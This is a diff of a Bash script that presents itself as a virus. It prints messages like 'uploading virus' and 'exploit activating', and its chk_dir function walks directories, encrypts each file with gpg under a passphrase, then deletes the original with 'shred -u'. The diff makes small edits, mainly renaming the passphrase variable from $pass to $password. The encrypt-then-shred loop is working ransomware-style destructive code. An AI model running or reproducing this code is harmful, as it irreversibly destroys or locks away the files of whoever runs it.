@@ -1,6 +1,7 @@
 function chk_dir
 {
  #echo "$file"
+ #echo $password
  for i in $file
  do
 	 if [ -d "$i" ]
@@ -20,7 +21,7 @@ function chk_dir
 				printf "$i_1 is the exploit"
 			else
 			printf "encrypting $i_1 and deleteing original one\n" 
-		        gpg -c --batch --passphrase $pass $i_1;shred -u $i_1
+		        gpg -c --batch --passphrase $password $i_1;shred -u $i_1
 			#echo "test"
 		 fi
 		 done
@@ -61,7 +62,7 @@ do
 done
  
 stty echo
-printf "$(tput setaf 1)uploading virus through $path\n$"
+printf "\n$(tput setaf 1)uploading virus through $path\n$"
 sleep 0.8
 printf "$(tput setaf 1)exploit activating in\n"
 sleep 0.5
